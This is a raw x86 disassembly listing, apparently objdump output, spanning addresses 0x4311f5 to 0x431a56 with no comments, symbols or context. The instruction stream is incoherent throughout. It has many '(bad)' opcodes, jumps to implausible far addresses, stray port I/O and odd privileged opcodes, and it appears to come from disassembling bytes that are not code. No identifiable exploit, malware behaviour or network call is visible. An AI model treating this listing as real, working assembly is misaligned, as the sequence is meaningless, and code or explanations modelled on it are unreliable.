  4311f5:	add    BYTE PTR [edi+0x546c16c0],dh
  4311fb:	add    BYTE PTR [ecx-0x5],dl
  4311fe:	add    eax,0x17200
  431203:	sbb    al,0x85
  431205:	dec    esp
  431206:	je     0x431240
  431208:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43120c:	add    BYTE PTR [ebx],bh
  43120e:	(bad)  
  43120f:	and    al,0x32
  431211:	jae    0x4311af
  431213:	mov    cl,cl
  431215:	inc    DWORD PTR [esp]
  431218:	push   ebp
  431219:	shr    esp,0x8
  43121c:	in     al,dx
  43121d:	push   esp
  43121e:	add    DWORD PTR [eax],esp
  431220:	add    bl,cl
  431222:	inc    ebp
  431223:	mov    bh,0x89
  431225:	add    ah,bh
  431227:	jmp    0xca752171
  43122c:	pushf  
  43122d:	dec    esp
  43122e:	mov    edx,0xf8178520
  431233:	fst    DWORD PTR [ebp+0x0]
  431236:	mov    BYTE PTR [eax],0xc4
  431239:	sub    edx,DWORD PTR [ebx-0x3f]
  43123c:	inc    ebp
  43123d:	add    eax,0xc601da
  431242:	mov    al,0xc6
  431245:	ins    BYTE PTR es:[edi],dx
  431246:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  43124d:	dec    esp
  43124e:	jmp    DWORD PTR [eax]
  431250:	inc    ebp
  431251:	fnstcw WORD PTR [esi+0x29]
  431254:	test   BYTE PTR [eax],0xc8
  431257:	rol    BYTE PTR [eax],0xc0
  43125a:	lea    ecx,[ebp-0x3cf0dbcb]
  431260:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  431266:	inc    esi
  431267:	add    DWORD PTR [eax],ebx
  431269:	add    dh,bh
  43126b:	mov    esi,DWORD PTR [edx+0x8]
  43126e:	(bad)  
  43126f:	fdiv   QWORD PTR ss:[ecx]
  431272:	(bad)  
  431273:	mov    bl,ch
  431275:	add    esi,eax
  431277:	add    dh,bl
  431279:	or     esi,eax
  43127b:	mov    dl,0xdf
  43127d:	add    esi,eax
  43127f:	add    al,ah
  431281:	push   cs
  431282:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431289:	or     BYTE PTR [ebx],dh
  43128b:	dec    ecx
  43128c:	lea    eax,[ebx]
  43128e:	xor    eax,0x18fc0fc7
  431293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431294:	repz clc 
  431296:	add    eax,DWORD PTR [ebp+0x46]
  431299:	prefetcht0 BYTE PTR [ecx-0x2]
  43129d:	xor    eax,0x7c60872
  4312a2:	mov    esp,0xbd32c69b
  4312a7:	pop    esi
  4312a8:	mov    cl,0xbe
  4312ab:	or     al,0xc6
  4312ad:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4312b4:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4312bb:	add    dh,al
  4312bd:	mov    eax,ebx
  4312bf:	xor    DWORD PTR [ebx],0x35008dbc
  4312c5:	mov    ecx,DWORD PTR [edi]
  4312c7:	sbb    al,0x18
  4312c9:	inc    ebp
  4312ca:	xrelease mov DWORD PTR [ebx],0x188546f4
  4312d1:	clc    
  4312d2:	(bad)  
  4312d3:	xor    DWORD PTR [edx-0x64],esi
  4312d6:	lea    ecx,[ecx+0x45ffe838]
  4312dc:	mov    ecx,ebx
  4312de:	fadd   st,st(6)
  4312e0:	dec    ebp
  4312e1:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4312e7:	out    0x1,eax
  4312e9:	inc    ebp
  4312ea:	lea    ebp,ds:0xc8ffc6ff
  4312f0:	enter  0xa33,0xc6
  4312f4:	push   ebp
  4312f5:	leave  
  4312f6:	(bad)  
  4312f7:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4312fd:	add    BYTE PTR [ebp+0x44],al
  431300:	mov    eax,esp
  431302:	mov    WORD PTR [esi+0x46398300],?
  431308:	psubusw mm4,QWORD PTR [esi-0x78]
  43130c:	add    BYTE PTR [ebx-0x1303f975],al
  431312:	add    BYTE PTR [ebp+0x1],0xeb
  431316:	add    BYTE PTR [ebp+0x38],al
  431319:	in     eax,dx
  43131a:	inc    ebp
  43131b:	inc    ebp
  43131c:	mov    ebx,ebx
  43131e:	add    BYTE PTR [ebp+0x0],0xec
  431322:	mov    DWORD PTR [ebp-0x41],eax
  431325:	sub    eax,0x2c00454e
  43132a:	ins    DWORD PTR es:[edi],dx
  43132b:	inc    ebp
  43132c:	add    BYTE PTR [esi+0x66],bh
  43132f:	test   BYTE PTR [ebp-0x2300bc],0xb6
  431336:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  431340:	dec    edi
  431341:	pop    es
  431342:	add    ah,ch
  431344:	mov    DWORD PTR [ebp+0x68],eax
  431347:	in     eax,dx
  431348:	inc    DWORD PTR [ebp-0x7d]
  43134b:	out    0xc0,al
  43134d:	inc    ebp
  43134e:	mov    edx,esp
  431350:	push   0x45
  431352:	(bad)  
  431353:	jmp    0xdf925910
  431358:	add    BYTE PTR [ebp-0x77],al
  43135b:	out    dx,al
  43135c:	ins    BYTE PTR es:[edi],dx
  43135d:	inc    ebp
  43135e:	jmp    edi
  431360:	add    DWORD PTR [ebp-0x14],0x7e
  431364:	mov    esi,esi
  431366:	outs   dx,BYTE PTR ds:[esi]
  431367:	inc    esp
  431368:	(bad)  
  431369:	mov    esp,0x8341b68d
  43136e:	mov    DWORD PTR [esi+0x70],eax
  431371:	fcos   
  431373:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  431379:	in     al,dx
  43137a:	jb     0x431301
  43137c:	(bad)  
  43137d:	dec    DWORD PTR [ebx-0x7aba9901]
  431383:	mov    edi,edi
  431385:	fdivr  st,st(7)
  431387:	out    dx,eax
  431388:	rcl    BYTE PTR [ebx],0x66
  43138b:	mov    DWORD PTR [ebp-0xc70075],eax
  431391:	(bad)  
  431392:	std    
  431393:	cmp    eax,DWORD PTR [eax]
  431395:	jne    0x4313fd
  431397:	mov    DWORD PTR [ebp-0xba0048],eax
  43139d:	in     al,dx
  43139e:	outs   dx,BYTE PTR ds:[esi]
  43139f:	pushf  
  4313a0:	add    BYTE PTR [ebx-0x7f7a039a],cl
  4313a6:	inc    DWORD PTR [ecx]
  4313a8:	inc    DWORD PTR [eax]
  4313aa:	jae    0x4313e4
  4313ac:	add    BYTE PTR [ebp+0x850266],al
  4313b2:	inc    DWORD PTR [ebp-0x1]
  4313b5:	mov    eax,eax
  4313b7:	jl     0x43141f
  4313b9:	add    BYTE PTR [ebp-0x740077],al
  4313bf:	cld    
  4313c0:	dec    eax
  4313c1:	add    BYTE PTR [eax],0x1
  4313c4:	data16 add BYTE PTR [ebp+0x38],al
  4313c8:	mov    eax,0x47c2
  4313cd:	mov    eax,0x824f89
  4313d2:	inc    edi
  4313d3:	mov    DWORD PTR [edx+0x64],ebp
  4313d6:	inc    WORD PTR [ebp-0x75]
  4313da:	(bad)  
  4313db:	data16 rol BYTE PTR [ebp-0x16001a],1
  4313e2:	inc    ebp
  4313e3:	jge    0x4313c4
  4313e5:	add    bh,ah
  4313e7:	lea    ax,[ebp-0x750030]
  4313ee:	add    al,0x46
  4313f1:	jmp    0x40ff:0x8885
  4313f7:	push   DWORD PTR [ebp+0x52]
  4313fa:	lea    eax,[eax]
  4313fc:	shl    BYTE PTR [esi-0x7b],1
  4313ff:	test   esi,edi
  431401:	(bad)  
  431402:	(bad)  
  431403:	inc    DWORD PTR [ebp-0x990140]
  431409:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43140f:	inc    edi
  431410:	push   ecx
  431411:	xor    ax,WORD PTR [ebp-0x8d0045]
  431418:	add    al,al
  43141a:	ret    
  43141b:	mov    ax,WORD PTR [ebp-0x3f0004]
  431422:	push   eax
  431423:	mov    DWORD PTR [ebp-0x77],0xff98748b
  43142a:	add    BYTE PTR [ebx-0x764f8839],al
  431430:	push   DWORD PTR [esi+0x1]
  431433:	inc    DWORD PTR [eax]
  431435:	mov    eax,0xff99ff
  43143a:	or     BYTE PTR [ecx-0x7a87bb],cl
  431440:	jne    0x4313fa
  431442:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  43144c:	mov    ecx,0xd74fb8
  431451:	add    cl,al
  431453:	mov    DWORD PTR [ecx-0x3f007784],ecx
  431459:	or     DWORD PTR [ebx+0x558966dc],0x7e
  431460:	(bad)  
  431461:	push   ebp
  431463:	mov    eax,0x8c2789
  431468:	ret    0x6689
  43146b:	adc    BYTE PTR [ebp+0x48],0x8d
  43146f:	add    bh,ah
  431471:	mov    WORD PTR [ebp-0x70],ax
  431475:	(bad)  
  431476:	ret    0x667d
  431479:	or     BYTE PTR [ebp-0x77],dl
  43147c:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431483:	loop   0x43140e
  431485:	(bad)  
  431486:	xchg   esi,eax
  431487:	aam    0xcf
  431489:	out    dx,al
  43148a:	mov    DWORD PTR [esi-0x68],edi
  43148d:	inc    ebp
  43148e:	dec    edx
  43148f:	pop    ecx
  431490:	mov    edx,DWORD PTR [eax]
  431492:	repnz push bp
  431495:	or     BYTE PTR [ebx+0x55106638],0x49
  43149c:	(bad)  
  43149d:	repnz xor eax,0xa0898945
  4314a3:	mov    ah,0x89
  4314a5:	jmp    DWORD PTR [edx+0x66b0418d]
  4314ab:	inc    DWORD PTR [ebp+0x50]
  4314ae:	add    DWORD PTR [ebp-0x5],0xffffffbe
  4314b2:	mov    DWORD PTR [eax],ecx
  4314b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4314b5:	pop    es
  4314b6:	inc    ecx
  4314b7:	(bad)  
  4314b8:	data16 fwait
  4314ba:	inc    ebp
  4314bb:	xor    ah,BYTE PTR [esi+0x3]
  4314be:	dec    ebp
  4314bf:	push   eax
  4314c0:	inc    bp
  4314c2:	jge    0x431447
  4314c4:	mov    esp,DWORD PTR [esi-0x18]
  4314c7:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4314cd:	add    DWORD PTR [ebx],esi
  4314cf:	add    BYTE PTR [ebx],al
  4314d1:	test   DWORD PTR [ebx],esi
  4314d3:	(bad)  
  4314d4:	inc    WORD PTR [ebp+0x0]
  4314d8:	mov    eax,DWORD PTR [eax]
  4314da:	call   0x8898cc0f
  4314df:	mov    esi,eax
  4314e1:	clc    
  4314e2:	ret    
  4314e3:	rol    cl,0xa
  4314e6:	mov    DWORD PTR ds:0x7c0ec88,esi
  4314ec:	mov    edx,edi
  4314ee:	pushf  
  4314ef:	pop    es
  4314f0:	jmp    FWORD PTR [edx+0x66]
  4314f3:	add    BYTE PTR [ebp-0x990175],al
  4314f9:	inc    ebp
  4314fa:	test   DWORD PTR [ebx-0x2f00f202],eax
  431500:	push   ebp
  431501:	mov    edi,eax
  431503:	mov    dh,BYTE PTR [eax+0x266ff51]
  431509:	push   ebp
  43150a:	add    BYTE PTR [ebx-0x764b0777],al
  431510:	dec    DWORD PTR [esi+0x661851e8]
  431516:	add    BYTE PTR [ebp-0x7b],dl
  431519:	cmp    esi,0xfffffffb
  43151c:	dec    DWORD PTR [ecx+0x51fe9285]
  431522:	jmp    DWORD PTR [esi-0x75]
  431525:	push   ebp
  431526:	hlt    
  431527:	data16 (bad) 
  431529:	dec    ebp
  43152a:	ret    
  43152b:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  431531:	lea    edx,[eax-0x1]
  431534:	jne    0x431507
  431536:	dec    DWORD PTR [ecx-0x2f7a63f8]
  43153c:	dec    BYTE PTR [ecx+0x51559eff]
  431542:	mov    DWORD PTR [esi-0x4c],esp
  431545:	push   ebp
  431546:	jmp    DWORD PTR [esi-0x18]
  431549:	inc    ebp
  43154a:	sbb    BYTE PTR [ebp-0x767ad900],cl
  431550:	(bad)  
  431551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431552:	inc    eax
  431554:	test   DWORD PTR [esi-0x2],esp
  431557:	inc    ebp
  431558:	dec    DWORD PTR [ebp-0x760bde75]
  43155e:	(bad)  
  43155f:	test   al,0xc3
  431561:	mov    DWORD PTR [ebp-0x769b56],ecx
  431567:	lods   al,BYTE PTR ds:[esi]
  431568:	push   eax
  431569:	inc    ebp
  43156a:	jne    0x43157b
  43156c:	dec    DWORD PTR [ebp+0x8]
  43156f:	mov    ecx,DWORD PTR [ebx]
  431571:	sbb    al,0x0
  431573:	(bad)  
  431574:	mov    eax,0xc14fc3
  431579:	mov    DWORD PTR [ecx-0xbabf64],ecx
  43157f:	movsx  ecx,WORD PTR [ebp+0x4e]
  431583:	xor    eax,DWORD PTR [eax]
  431585:	add    eax,edi
  431587:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43158d:	xor    edi,DWORD PTR [eax+0x854f66]
  431593:	dec    BYTE PTR [ecx-0x76bb01]
  431599:	mov    BYTE PTR [ebx-0x76724001],al
  43159f:	pushf  
  4315a0:	inc    esi
  4315a1:	(bad)  
  4315a2:	dec    DWORD PTR [ebp-0x7abe6373]
  4315a8:	sar    esi,0x89
  4315ab:	dec    DWORD PTR [eax+0x0]
  4315ae:	inc    DWORD PTR [eax]
  4315b0:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  4315b7:	xlat   BYTE PTR ds:[ebx]
  4315b8:	dec    edx
  4315b9:	add    bh,bh
  4315bb:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  4315c1:	lea    esp,[esi-0x50]
  4315c4:	(bad)  
  4315c5:	(bad)  
  4315c6:	call   DWORD PTR [eax-0x1]
  4315c9:	inc    ebp
  4315ca:	rdpmc  
  4315cc:	add    BYTE PTR [ebx],al
  4315ce:	push   ax
  4315d0:	lea    eax,[ebp-0x1]
  4315d6:	js     0x4315d7
  4315d8:	add    al,bh
  4315da:	push   bp
  4315dc:	lea    ecx,[ebp-0x7701]
  4315e2:	fmul   DWORD PTR [ebp-0x7a997800]
  4315e8:	(bad)  
  4315e9:	(bad)  
  4315ea:	(bad)  
  4315eb:	(bad)  
  4315ec:	jmp    DWORD PTR [ecx-0x7676ffb3]
  4315f2:	dec    eax
  4315f3:	mov    eax,0x8d8dffff
  4315f8:	mov    al,0xb0
  4315fa:	(bad)  
  4315fb:	call   DWORD PTR [ecx+0x50]
  4315fe:	dec    ebp
  4315ff:	inc    ebp
  431600:	mov    esi,0x7030833
  431605:	push   eax
  431606:	into   
  431607:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43160d:	call   DWORD PTR [ecx-0x8]
  431610:	lea    edx,[ebp-0x1]
  431613:	jmp    0x761817
  431618:	inc    eax
  431619:	jnp    0x4315a8
  43161b:	add    dh,bh
  43161d:	inc    WORD PTR [ebp-0x8a00b0]
  431624:	mov    edx,eax
  431626:	inc    esp
  431627:	add    bh,bh
  431629:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  43162f:	dec    DWORD PTR [ebx-0x7f820301]
  431635:	add    BYTE PTR [ecx],al
  431637:	data16 add BYTE PTR [ebp-0xb30077],al
  43163e:	inc    eax
  431640:	(bad)  
  431641:	dec    si
  431643:	test   edi,edi
  431645:	(bad)  
  431646:	cmp    edi,edi
  431648:	add    ecx,DWORD PTR [edi-0x39]
  43164b:	mov    edx,DWORD PTR [edx+0x66]
  43164e:	inc    DWORD PTR [ebp-0x3d00cb]
  431654:	mov    eax,0x66ff8b5e
  43165a:	jmp    0xb4ff:0xc7ff3895
  431661:	push   ecx
  431662:	inc    DWORD PTR [ebx-0x76ffccbb]
  431668:	call   DWORD PTR [esi-0x1]
  43166b:	dec    DWORD PTR [eax]
  43166d:	mov    ecx,0x805ff
  431672:	inc    ebp
  431673:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  431679:	mov    ecx,0x35784
  43167e:	add    BYTE PTR [ecx-0xffa59b],cl
  431684:	inc    ebp
  431685:	mov    ecx,0x9c6131
  43168a:	(bad)  
  43168b:	mov    eax,ebx
  43168d:	pop    esp
  43168e:	test   edi,edi
  431690:	clc    
  431691:	lea    eax,[ebp-0x24]
  431694:	cmp    eax,0xc7fe9c8d
  431699:	push   eax
  43169b:	lea    eax,[ebp+0x45fff8fe]
  4316a1:	mov    esi,DWORD PTR [ecx]
  4316a3:	hlt    
  4316a4:	lahf   
  4316a5:	push   esp
  4316a6:	mov    edx,DWORD PTR [ecx-0x4]
  4316a9:	xor    eax,DWORD PTR [eax+0x7201bb]
  4316af:	add    BYTE PTR [ebp-0x35],al
  4316b2:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  4316b8:	mov    edx,DWORD PTR [ecx-0x74]
  4316bb:	rol    BYTE PTR [eax],0x8d
  4316be:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  4316c2:	nop
  4316c3:	push   ecx
  4316c4:	add    bh,bh
  4316c6:	mov    esp,edi
  4316c8:	in     al,0x85
  4316ca:	jge    0x4316ca
  4316cc:	test   edi,edi
  4316ce:	jne    0x431655
  4316d0:	(bad)  
  4316d1:	(bad)  
  4316d2:	sbb    bh,bh
  4316d4:	push   ebp
  4316d5:	inc    ebp
  4316d6:	call   0xffdc1166
  4316db:	add    BYTE PTR [ebp+0x66],al
  4316de:	mov    edx,DWORD PTR [ebp-0xfc0075]
  4316e4:	cmp    al,0x85
  4316e6:	ud0    eax,DWORD PTR [ebp-0x1]
  4316ea:	test   DWORD PTR [edi+0x74],ecx
  4316ed:	dec    edi
  4316ee:	inc    DWORD PTR [ebp-0x530004]
  4316f4:	dec    DWORD PTR [edi-0x75]
  4316f7:	dec    esi
  4316f8:	cld    
  4316f9:	test   DWORD PTR [eax+0xff01ff],eax
  4316ff:	icebp  
  431700:	add    BYTE PTR [edi-0x3a],cl
  431703:	test   ebx,eax
  431705:	inc    BYTE PTR [ebp-0x1]
  431708:	jne    0x43170a
  43170a:	mov    eax,DWORD PTR [eax]
  43170c:	cld    
  43170d:	xor    BYTE PTR [ecx+0x500155],cl
  431713:	push   ebp
  431714:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43171a:	add    BYTE PTR [ebp+0x35e90f50],al
  431720:	add    al,BYTE PTR [eax]
  431722:	add    BYTE PTR [ebx-0x38fe4f80],al
  431728:	add    ah,ch
  43172a:	or     BYTE PTR [ebp+0x4501f845],dh
  431730:	jmp    0xdf1a26
  431735:	(bad)  
  431736:	nop    ecx
  431739:	test   DWORD PTR [ebp+0x4502f8],eax
  43173f:	xor    ecx,DWORD PTR [ebp-0x64]
  431742:	mov    eax,edi
  431744:	mov    ebx,DWORD PTR [eax+edx*2]
  431747:	add    eax,0x45fef885
  43174c:	dec    DWORD PTR [ebx+0x339445]
  431752:	add    ecx,DWORD PTR [ecx+0x4500f889]
  431758:	dec    DWORD PTR [ebx-0x460f0375]
  43175e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43175f:	add    esi,edi
  431761:	add    bh,bh
  431763:	rdpmc  
  431765:	add    BYTE PTR [ebx],0x1
  431768:	mov    DWORD PTR [eax],eax
  43176a:	add    al,0x45
  43176c:	dec    DWORD PTR [ecx-0x360b3373]
  431772:	dec    DWORD PTR [esi]
  431774:	push   eax
  431775:	jne    0x4317bc
  431777:	mov    esi,DWORD PTR [ebx]
  431779:	cld    
  43177a:	add    esp,ecx
  43177c:	push   eax
  43177d:	inc    DWORD PTR [ebp-0x75]
  431780:	add    eax,0x800e4
  431785:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43178b:	mov    DWORD PTR [ecx],eax
  43178d:	sbb    al,0x0
  43178f:	leave  
  431790:	test   DWORD PTR [edi-0x2],eax
  431793:	jne    0x431794
  431795:	call   0xff44019a
  43179a:	xor    BYTE PTR [ebp+0x4d],al
  43179d:	mov    edi,edi
  43179f:	enter  0x8,0x4d
  4317a3:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  4317a9:	mov    eax,DWORD PTR [eax]
  4317ab:	cld    
  4317ac:	add    DWORD PTR [ecx],ebx
  4317ae:	inc    ebp
  4317af:	dec    ebp
  4317b0:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  4317b6:	inc    eax
  4317b7:	dec    DWORD PTR [ecx-0x270375]
  4317bd:	add    BYTE PTR [ebx-0x39d72701],cl
  4317c3:	xchg   ecx,eax
  4317c4:	ret    
  4317c5:	add    BYTE PTR [ebp-0x830075],al
  4317cb:	add    BYTE PTR [ebp-0x75],al
  4317ce:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4317d4:	lea    edi,[edi-0xc]
  4317d7:	add    bh,bh
  4317d9:	mov    edx,DWORD PTR [eax-0x7b]
  4317dc:	inc    ebp
  4317dd:	rdpmc  
  4317df:	jne    0x4317e4
  4317e1:	add    BYTE PTR [eax-0x75],dl
  4317e4:	inc    ebp
  4317e5:	clc    
  4317e6:	add    eax,0x400009
  4317eb:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4317f1:	mov    eax,DWORD PTR [ecx]
  4317f3:	in     al,dx
  4317f4:	add    dh,al
  4317f6:	test   ebx,eax
  4317f8:	inc    BYTE PTR [ebp-0xff0001]
  4317fe:	add    BYTE PTR [ebp-0x43],al
  431801:	cmp    esi,0xfffffff8
  431804:	(bad)  
  431805:	push   DWORD PTR [eax]
  431807:	add    BYTE PTR [ebp-0x3a],dl
  43180a:	test   ebx,eax
  43180c:	je     0x431793
  43180e:	mov    edi,edi
  431810:	sbb    al,0xff
  431812:	test   DWORD PTR gs:[eax],eax
  431815:	(bad)  
  431816:	js     0x431817
  431818:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43181e:	sub    eax,ebx
  431820:	mov    ecx,DWORD PTR [ebx-0x55130377]
  431826:	add    eax,DWORD PTR [eax]
  431828:	dec    ebp
  431829:	push   eax
  43182a:	mov    al,BYTE PTR [ebp+0x1]
  43182d:	mov    eax,DWORD PTR [ebp-0x68]
  431830:	mov    eax,DWORD PTR [eax]
  431832:	sbb    bh,al
  431834:	or     ah,dh
  431836:	dec    ebp
  431837:	inc    DWORD PTR [eax+0x4]
  43183a:	push   ecx
  43183b:	add    BYTE PTR [edx-0x1],dh
  43183e:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431844:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  43184e:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431854:	push   ecx
  431855:	cmp    BYTE PTR [ebx],al
  431857:	inc    ebp
  431858:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  43185e:	(bad)  
  43185f:	(bad)  
  431860:	in     al,0xff
  431862:	add    BYTE PTR [ebp+0x0],al
  431865:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43186b:	add    al,bh
  43186d:	(bad)  
  43186e:	jmp    0x8d85:0x74b0558d
  431875:	dec    DWORD PTR [eax]
  431877:	call   DWORD PTR [ebp-0x7b]
  43187a:	mov    edi,esi
  43187c:	lock call DWORD PTR [ebp-0x75]
  431880:	mov    esi,esp
  431882:	mov    ah,0xc6
  431884:	mov    bh,0xc3
  431886:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43188c:	add    DWORD PTR [eax],0x450050ff
  431892:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431898:	inc    edi
  43189a:	push   esp
  43189c:	jmp    0xcd00:0x650481ff
  4318a3:	mov    DWORD PTR [ebx],esi
  4318a5:	clc    
  4318a6:	cmp    edi,0xff9cff3c
  4318ac:	jne    0x4318b6
  4318ae:	mov    eax,eax
  4318b0:	add    esi,DWORD PTR [eax]
  4318b2:	int3   
  4318b3:	inc    ebp
  4318b4:	cmp    al,0x83
  4318b6:	add    BYTE PTR [eax],bl
  4318b8:	adc    DWORD PTR [ebx+0x768b5055],eax
  4318be:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4318c4:	mov    edi,eax
  4318c6:	cmp    BYTE PTR [ebp+0x45],cl
  4318c9:	jmp    0x431856
  4318cb:	mov    ebx,DWORD PTR [esp+ebp*8]
  4318ce:	inc    ebp
  4318cf:	or     al,0x2
  4318d1:	dec    DWORD PTR [ebp+0x18]
  4318d4:	jne    0x43192b
  4318d6:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4318dc:	mov    edi,DWORD PTR [ebx]
  4318de:	in     al,0x50
  4318e0:	xchg   ecx,eax
  4318e1:	jmp    0x34367e6
  4318e6:	adc    al,0x8b
  4318e8:	inc    ebp
  4318e9:	mov    al,ds:0x8b04008b
  4318ee:	push   ebp
  4318ef:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4318f5:	push   ebp
  4318f6:	test   DWORD PTR [ebx-0x2800d701],ecx
  4318fc:	inc    ebp
  4318fd:	dec    ebp
  4318fe:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431904:	mov    DWORD PTR [eax],0xe9ff00f4
  43190a:	add    al,0x0
  43190c:	add    BYTE PTR [eax],al
  43190e:	mov    eax,edx
  431910:	push   eax
  431911:	rol    DWORD PTR [ebp-0xf0177],1
  431917:	bound  eax,QWORD PTR [ebp+0x50]
  43191a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  431920:	add    BYTE PTR [ecx+0x558df0ff],cl
  431926:	mov    al,0xf
  431928:	test   DWORD PTR [edx],edx
  43192a:	call   DWORD PTR [ebp-0x7a0001]
  431930:	(bad)  
  431931:	loop   0x431932
  431933:	jnp    0xc6990d39
  431939:	mov    eax,ebx
  43193b:	cmp    al,0x8b
  43193d:	(bad)  
  43193e:	cld    
  43193f:	shr    esi,0xc
  431942:	add    dl,al
  431944:	push   eax
  431945:	lea    eax,[ebp-0x1]
  431948:	mov    edx,esi
  43194a:	cwde   
  43194b:	cli    
  43194c:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431952:	or     BYTE PTR [eax],cl
  431954:	inc    ebp
  431955:	dec    ebp
  431956:	inc    DWORD PTR [ebx+0x74803914]
  43195c:	add    DWORD PTR [ebx+0x451800],ecx
  431962:	call   DWORD PTR [eax+edx*1]
  431965:	add    ecx,DWORD PTR [ebp-0x34]
  431968:	push   edi
  431969:	adc    al,0x8
  43196b:	mov    edx,DWORD PTR [ebp-0x14]
  43196e:	mov    ecx,DWORD PTR [ebp+0x18]
  431971:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431975:	inc    DWORD PTR [eax+esi*8]
  431978:	inc    ebp
  431979:	stos   BYTE PTR es:[edi],al
  43197a:	mov    edx,DWORD PTR [ebp-0x4]
  43197d:	add    DWORD PTR [ebp-0x1c],eax
  431980:	mov    edx,DWORD PTR [ebp-0x70]
  431983:	cmp    eax,DWORD PTR [eax]
  431985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431986:	mov    eax,DWORD PTR [eax]
  431988:	cld    
  431989:	jae    0x43190b
  43198b:	add    eax,DWORD PTR [ecx]
  43198d:	clc    
  43198e:	add    BYTE PTR [eax+0x30],dl
  431991:	mov    DWORD PTR [ecx],esi
  431993:	clc    
  431994:	pop    ds
  431995:	inc    ebp
  431996:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43199c:	(bad)  
  43199d:	push   DWORD PTR [edi]
  43199f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  4319a5:	(bad)  
  4319a6:	jae    0x4319a7
  4319a8:	mov    eax,DWORD PTR [ebp-0x740175]
  4319ae:	sub    eax,DWORD PTR [eax]
  4319b0:	add    eax,DWORD PTR [eax]
  4319b2:	mov    DWORD PTR [ecx+0x5f],eax
  4319b5:	mov    DWORD PTR [ebx-0x4],ebx
  4319b8:	ret    0xff
  4319bb:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4319c1:	ret    
  4319c2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4319c8:	add    BYTE PTR [ebp-0x7d],al
  4319cb:	mov    DWORD PTR [eax],eax
  4319cd:	add    al,0x84
  4319cf:	inc    DWORD PTR [ecx]
  4319d1:	lea    eax,[eax]
  4319d3:	hlt    
  4319d4:	sar    bh,cl
  4319d6:	test   BYTE PTR [eax+0x1],dl
  4319d9:	inc    ebp
  4319da:	add    BYTE PTR [ebx],dh
  4319dc:	test   BYTE PTR [ebx],0x84
  4319df:	push   eax
  4319e0:	add    BYTE PTR [ebp+0x0],al
  4319e3:	add    eax,0x86
  4319e8:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4319ee:	add    BYTE PTR [ecx],al
  4319f0:	add    BYTE PTR [eax],al
  4319f2:	mov    esi,0x550030
  4319f7:	mov    ecx,DWORD PTR [edi]
  4319f9:	cld    
  4319fa:	fidiv  DWORD PTR [ebp+0x0]
  4319fd:	mov    edi,DWORD PTR [ecx]
  4319ff:	xor    BYTE PTR [eax+eax*1],0x84
  431a03:	add    eax,DWORD PTR [eax]
  431a05:	sbb    BYTE PTR [eax],al
  431a07:	jne    0x4319ba
  431a09:	mov    eax,DWORD PTR [ecx]
  431a0b:	sbb    BYTE PTR [eax],al
  431a0d:	mov    DWORD PTR [ebp-0x1],esp
  431a10:	add    BYTE PTR [eax+0x30e45ca],bh
  431a16:	ret    0xb7fc
  431a19:	dec    ebp
  431a1a:	or     al,0x89
  431a1c:	dec    ebp
  431a1d:	cld    
  431a1e:	cmovne ecx,DWORD PTR [eax-0x75]
  431a22:	add    edi,esp
  431a24:	seto   BYTE PTR [esi-0x72ffffff]
  431a2b:	inc    ebp
  431a2c:	adc    al,0x8b
  431a2e:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  431a35:	cmp    DWORD PTR [edi+0x72],edx
  431a38:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  431a3e:	gs cmp al,0x0
  431a41:	je     0x431a19
  431a43:	push   eax
  431a44:	sar    BYTE PTR [eax],1
  431a46:	mov    bh,0x3e
  431a48:	push   cs
  431a49:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  431a4f:	add    DWORD PTR [ecx+0x12],ebp
  431a52:	dec    edx
  431a53:	(bad)  
  431a54:	mov    eax,edx
  431a56:	in     al,dx
